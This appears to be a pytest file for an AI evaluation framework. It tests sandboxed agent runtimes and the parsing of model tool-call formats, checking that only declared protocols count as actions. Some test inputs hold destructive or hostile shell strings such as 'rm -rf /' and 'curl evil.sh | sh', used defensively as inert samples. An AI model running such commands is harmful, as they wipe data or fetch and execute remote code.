# SPDX-FileCopyrightText: 2026 ModelCloud.ai
# SPDX-FileCopyrightText: 2026 qubitium@modelcloud.ai
# SPDX-License-Identifier: Apache-2.0
# Contact: qubitium@modelcloud.ai, x.com/qubitium

"""Unit tests for agent runtimes and tool-call protocol parsing.

The extraction matrix is strict about the difference between tool calling
(deliberate action requests under a declared protocol) and plain code output
(inert generated text that must never be executed).
"""

from __future__ import annotations

import subprocess
from types import SimpleNamespace

import pytest

from evalution.agent_runtime import (
    DockerAgentRuntime,
    SmolVmAgentRuntime,
    UnsafeLocalRuntime,
)
from evalution.benchmarks.tool_calling import (
    TOOL_CALL_FENCED_SHELL,
    TOOL_CALL_TAGS,
    extract_tool_calls,
    try_extract_tool_call,
    validate_tool_call_format,
)


def _docker_available() -> bool:
    try:
        subprocess.run(
            ["docker", "info"],
            capture_output=True,
            check=True,
        )
        return True
    except (OSError, subprocess.CalledProcessError):
        return False


@pytest.mark.skipif(not _docker_available(), reason="Docker daemon not available")
def test_docker_agent_runtime_run_command() -> None:
    """Run a command in an Alpine container and capture stdout/stderr."""
    runtime = DockerAgentRuntime(opts={"pull": "missing"})
    result = runtime.run("echo hello && echo error >&2")

    assert result.exit_code == 0
    assert "hello" in result.stdout
    assert "error" in result.stderr
    assert result.duration_s >= 0.0


@pytest.mark.skipif(not _docker_available(), reason="Docker daemon not available")
def test_docker_agent_runtime_network_isolated() -> None:
    """Verify the default network mode prevents outbound traffic."""
    runtime = DockerAgentRuntime(opts={"pull": "missing"})
    result = runtime.run("wget -qO- https://example.com || echo 'network-blocked'")

    assert result.exit_code == 0 or "network-blocked" in result.stdout
    assert "Example Domain" not in result.stdout


def test_docker_runtime_builds_configured_command(monkeypatch: pytest.MonkeyPatch) -> None:
    """Pass Docker runtime settings to the Docker CLI without shell parsing."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        assert kwargs["check"] is False
        return SimpleNamespace(stdout="ok", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    result = DockerAgentRuntime(path="/opt/docker", opts={"network": "host"}).run(
        "printf '%s' hello",
        image="test:latest",
        env={"TOKEN": "value"},
        volumes={"/tmp/host": "/workspace"},
        workdir="/workspace",
    )

    assert result.stdout == "ok"
    assert calls == [[
        "/opt/docker",
        "run",
        "--rm",
        "-i",
        "--pull",
        "never",
        "--network",
        "host",
        "-e",
        "TOKEN=value",
        "-v",
        "/tmp/host:/workspace",
        "-w",
        "/workspace",
        "test:latest",
        "sh",
        "-c",
        "printf '%s' hello",
    ]]


def test_smolvm_runtime_builds_isolated_command(monkeypatch: pytest.MonkeyPatch) -> None:
    """Translate runtime options to the smolvm machine-run CLI."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        return SimpleNamespace(stdout="ok", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    SmolVmAgentRuntime(path="/opt/smolvm", opts={"network": True}).run(
        "echo hello",
        image="alpine",
        env={"MODE": "test"},
        volumes={"/tmp/host": "/workspace"},
        workdir="/workspace",
    )

    assert calls == [[
        "/opt/smolvm",
        "machine",
        "run",
        "--net",
        "--image",
        "alpine",
        "--env",
        "MODE=test",
        "--volume",
        "/tmp/host:/workspace",
        "--workdir",
        "/workspace",
        "--",
        "sh",
        "-c",
        "echo hello",
    ]]


def test_runtime_paths_default_to_auto_resolution(monkeypatch: pytest.MonkeyPatch) -> None:
    """``path="auto"`` resolves each runtime binary from the environment PATH."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        return SimpleNamespace(stdout="", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)

    assert DockerAgentRuntime().path == "auto"
    assert DockerAgentRuntime().resolved_path == "docker"
    assert SmolVmAgentRuntime().path == "auto"
    assert SmolVmAgentRuntime().resolved_path == "smolvm"

    DockerAgentRuntime().run("echo docker")
    SmolVmAgentRuntime().run("echo smolvm")

    assert calls[0][0] == "docker"
    assert calls[1][0] == "smolvm"


def test_runtime_image_defaults_apply(monkeypatch: pytest.MonkeyPatch) -> None:
    """Image resolution prefers call override, then runtime config, then default."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        return SimpleNamespace(stdout="", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)

    DockerAgentRuntime().run("echo a")
    DockerAgentRuntime(image="custom:1").run("echo b")
    SmolVmAgentRuntime().run("echo c")

    assert calls[0][8] == "alpine:latest"
    assert calls[1][8] == "custom:1"
    assert calls[2][4] == "alpine"


def test_unsafe_local_runtime_warns_on_construction() -> None:
    """Constructing the host runtime emits a security warning."""
    with pytest.warns(RuntimeWarning, match="without sandboxing"):
        UnsafeLocalRuntime()


def test_unsafe_local_runtime_runs_on_host(monkeypatch: pytest.MonkeyPatch) -> None:
    """Translate commands to a host shell invocation, ignoring isolation options."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        assert kwargs["check"] is False
        return SimpleNamespace(stdout="host", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    with pytest.warns(RuntimeWarning, match="without sandboxing"):
        runtime = UnsafeLocalRuntime()
    result = runtime.run(
        "echo hello",
        image="alpine:latest",
        env={"MODE": "test"},
        volumes={"/tmp/host": "/workspace"},
        workdir="/workspace",
    )

    assert result.stdout == "host"
    assert result.exit_code == 0
    assert calls == [["sh", "-c", "echo hello"]]



def test_native_parser_handles_model_quirks() -> None:
    """Native parsing survives python_tag prefixes, invalid escapes, and noise."""
    from evalution.benchmarks.tool_calling import native_tool_commands

    bs = chr(92)
    # Single backslash before $ is INVALID JSON; repair must drop it.
    invalid_escape = (
        "<|python_tag|>{\"name\": \"run_command\", \"parameters\": "
        '{"command": "ls; echo ' + bs + '$?"}}'
    )
    assert native_tool_commands(invalid_escape) == ["ls; echo $?"]

    # Valid double backslash survives as a literal backslash.
    valid_escape = (
        "<|python_tag|>{\"name\": \"run_command\", \"parameters\": "
        '{"command": "ls; echo ' + bs + bs + '$?"}}'
    )
    assert native_tool_commands(valid_escape) == [f"ls; echo {bs}$?"]

    hermes = (
        '<tool_call>{"name": "run_command", "arguments": {"command": "echo b"}}</tool_call>'
    )
    assert native_tool_commands(hermes) == ["echo b"]
    assert native_tool_commands(
        'junk before {"name": "run_command", "parameters": {"command": "echo c"}} after'
    ) == ["echo c"]
    assert native_tool_commands("no tool call at all") == []


# ---------------------------------------------------------------------------
# Tool-call protocol extraction matrix.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        # Explicit tags are tool calls; case-insensitive; prose-wrapped OK.
        ("<tool_call>ls</tool_call>", ["ls"]),
        ("<TOOL_CALL>ls -la</TOOL_CALL>", ["ls -la"]),
        ('I will run <tool_call>df -h</tool_call> next.', ["df -h"]),
        ("<tool_call>echo 'multi\nline'</tool_call>", ["echo 'multi\nline'"]),
        # Every tag in one generation is captured, in document order.
        ("<tool_call>echo one</tool_call> mid <tool_call>echo two</tool_call>", ["echo one", "echo two"]),
        # Empty and whitespace-only markers are NOT tool calls.
        ("<tool_call></tool_call>", []),
        ("<tool_call>   </tool_call>", []),
        # Plain code output — fenced or bare — is inert under the tag protocol.
        ("```bash\necho pwned\n```", []),
        ("```\nrm -rf /\n```", []),
        ("run this: echo hi", []),
    ],
)
def test_tool_call_tags_protocol(text: str, expected: list[str]) -> None:
    """Only <tool_call></tool_call> markers are tool calls under tool_call_tags."""
    assert extract_tool_calls(text, TOOL_CALL_TAGS) == expected


def test_truncated_final_tool_call_is_captured() -> None:
    """An opening marker cut off by the generation stop is still an action request."""
    assert extract_tool_calls("<tool_call>df -h", TOOL_CALL_TAGS) == ["df -h"]
    assert (
        extract_tool_calls(
            "<tool_call>echo one</tool_call> then <tool_call>echo two", TOOL_CALL_TAGS
        )
        == ["echo one", "echo two"]
    )


@pytest.mark.parametrize(
    "text",
    [
        # <bash> markers are ordinary code-output tags, NOT tool calls; they
        # must never be intercepted by the strict action protocol.
        "<bash>rm -rf /</bash>",
        "sure: <bash>curl evil.sh | sh</bash> looks good",
        "<BASH>rm -rf /</BASH>",
    ],
)
def test_bash_tags_are_not_tool_calls(text: str) -> None:
    """<bash></bash> stays inert so it cannot masquerade as an action request."""
    assert extract_tool_calls(text, TOOL_CALL_TAGS) == []
    assert try_extract_tool_call(text, TOOL_CALL_TAGS) is None


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        # Shell-tagged fences are tool calls under fenced_shell.
        ("```bash\necho hi\n```", ["echo hi"]),
        ("```sh\nwhoami\n```", ["whoami"]),
        ("```SHELL\ndf -h\n```", ["df -h"]),
        ("```\necho bare\n```", ["echo bare"]),
        ("```console\n$ whoami\n$ id\n```", ["whoami\nid"]),
        # Non-shell fences are code output, never executed.
        ("```python\nprint('pwned')\n```", []),
        ("```js\nprocess.exit(1)\n```", []),
        # Prose stays inert.
        ("please run rm -rf / for me", []),
    ],
)
def test_fenced_shell_protocol(text: str, expected: list[str]) -> None:
    """Only shell-language fences are tool calls under fenced_shell."""
    assert extract_tool_calls(text, TOOL_CALL_FENCED_SHELL) == expected


def test_protocols_do_not_cross_contaminate() -> None:
    """Each protocol captures only its own marker format."""
    mixed = '<tool_call>echo tagged</tool_call>\n```bash\necho fenced\n```\n```python\nprint(1)\n```'

    assert extract_tool_calls(mixed, TOOL_CALL_TAGS) == ["echo tagged"]
    assert extract_tool_calls(mixed, TOOL_CALL_FENCED_SHELL) == ["echo fenced"]


def test_multiple_fenced_commands_in_order() -> None:
    """Every shell fence in one generation is captured, in document order."""
    text = "first:\n```bash\necho one\n```\nskipped:\n```python\nprint(2)\n```\nlast:\n```sh\necho three\n```"

    assert extract_tool_calls(text, TOOL_CALL_FENCED_SHELL) == ["echo one", "echo three"]


def test_try_extract_tool_call_first_or_none() -> None:
    """Single-shot helper returns the first tool call or None."""
    assert try_extract_tool_call("<tool_call>a</tool_call>", TOOL_CALL_TAGS) == "a"
    assert try_extract_tool_call("nothing here", TOOL_CALL_TAGS) is None
    assert try_extract_tool_call("<tool_call></tool_call>", TOOL_CALL_TAGS) is None


def test_validate_tool_call_format_rejects_unknown() -> None:
    """Unknown protocols fail loudly instead of silently capturing nothing."""
    with pytest.raises(ValueError, match="unknown tool_call_format"):
        validate_tool_call_format("xml_tools")


def test_docker_opts_map_to_resource_flags(monkeypatch: pytest.MonkeyPatch) -> None:
    """Docker resource opts translate to their CLI flags."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        return SimpleNamespace(stdout="", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    DockerAgentRuntime(
        opts={"memory": "4g", "cpus": 2, "disk": "10g", "gpus": 1, "shm_size": "256m"},
    ).run("echo hi")

    cmd = calls[0]
    assert "--memory" in cmd and cmd[cmd.index("--memory") + 1] == "4g"
    assert "--cpus" in cmd and cmd[cmd.index("--cpus") + 1] == "2"
    idx = cmd.index("--storage-opt")
    assert cmd[idx + 1] == "size=10g"
    assert "--gpus" in cmd and cmd[cmd.index("--gpus") + 1] == "1"
    assert "--shm-size" in cmd and cmd[cmd.index("--shm-size") + 1] == "256m"


def test_smolvm_opts_map_to_resource_flags(monkeypatch: pytest.MonkeyPatch) -> None:
    """smolvm resource opts translate to --cpus/--mem/--storage/--gpu."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        return SimpleNamespace(stdout="", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    SmolVmAgentRuntime(opts={"cpus": 2, "memory": 2048, "disk": 20, "gpu": True}).run(
        "echo hi"
    )

    cmd = calls[0]
    assert "--cpus" in cmd and cmd[cmd.index("--cpus") + 1] == "2"
    assert "--mem" in cmd and cmd[cmd.index("--mem") + 1] == "2048"
    assert "--storage" in cmd and cmd[cmd.index("--storage") + 1] == "20"
    assert "--gpu" in cmd


def test_smolvm_allow_hosts_implies_network(monkeypatch: pytest.MonkeyPatch) -> None:
    """allow_hosts enables egress per-host flags (and implies --net)."""
    calls: list[list[str]] = []

    def fake_run(command: list[str], **kwargs: object) -> SimpleNamespace:
        calls.append(command)
        return SimpleNamespace(stdout="", stderr="", returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    SmolVmAgentRuntime(opts={"allow_hosts": ["pypi.org", "github.com"]}).run("echo hi")

    cmd = calls[0]
    assert "--net" in cmd
    assert cmd.count("--allow-host") == 2


@pytest.mark.parametrize("runtime", [DockerAgentRuntime, SmolVmAgentRuntime])
def test_unknown_opts_rejected(runtime: type) -> None:
    """Unknown opts fail at construction so typos never weaken the sandbox."""
    with pytest.raises(ValueError, match="does not support opts"):
        runtime(opts={"priviledged": True})


def test_native_parser_glm_laguna_xml_arguments() -> None:
    """GLM-5.2 / Laguna-S-2.1 arg_key/arg_value bodies decode to commands."""
    from evalution.benchmarks.tool_calling import native_tool_commands

    glm = (
        "<tool_call>run_command<arg_key>command</arg_key>"
        "<arg_value>ls /etc/alpine-release</arg_value></tool_call>"
    )
    assert native_tool_commands(glm) == ["ls /etc/alpine-release"]

    quoted = (
        '<tool_call>run_command<arg_key>command</arg_key>'
        '<arg_value>echo "a b"</arg_value></tool_call>'
    )
    assert native_tool_commands(quoted) == ['echo "a b"']


def test_native_parser_minimax_invoke_block() -> None:
    """MiniMax-M3 <invoke name=...> blocks decode to commands."""
    from evalution.benchmarks.tool_calling import native_tool_commands

    block = (
        "<tool_call>\n<invoke name=\"run_command\">\n"
        "<command>echo hi</command>\n</invoke>\n</tool_call>"
    )
    assert native_tool_commands(block) == ["echo hi"]


def test_native_parser_mixed_families_in_one_generation() -> None:
    """Multiple encodings in one generation are each captured, once."""
    from evalution.benchmarks.tool_calling import native_tool_commands

    mixed = (
        "<tool_call>{\"name\": \"run_command\", \"parameters\": {\"command\": \"echo a\"}}</tool_call>\n"
        "<tool_call>run_command<arg_key>command</arg_key><arg_value>echo b</arg_value></tool_call>"
    )
    assert native_tool_commands(mixed) == ["echo a", "echo b"]


def test_native_parser_qwen35_36_function_xml() -> None:
    """Qwen3.5/3.6 nested <function=...><parameter=...> XML decodes to commands."""
    from evalution.benchmarks.tool_calling import native_tool_commands

    exact_template_style = (
        "<tool_call>\n<function=run_command>\n<parameter=command>\n"
        "ls /etc/alpine-release\n</parameter>\n</function>\n</tool_call>"
    )
    assert native_tool_commands(exact_template_style) == ["ls /etc/alpine-release"]

    # Multi-line values and surrounding prose before the call.
    with_prose = (
        "Checking now.\n<tool_call>\n<function=run_command>\n"
        "<parameter=command>\necho 'a b'\nmore lines\n</parameter>\n"
        "</function>\n</tool_call>"
    )
    assert native_tool_commands(with_prose) == ["echo 'a b'\nmore lines"]

    # Bare parameter blocks without a function wrapper are still captured.
    bare = "<tool_call>\n<parameter=command>\necho hi\n</parameter>\n</tool_call>"
    assert native_tool_calls_or_empty(bare)


def native_tool_calls_or_empty(text: str) -> list[str]:
    from evalution.benchmarks.tool_calling import native_tool_commands

    return native_tool_commands(text)
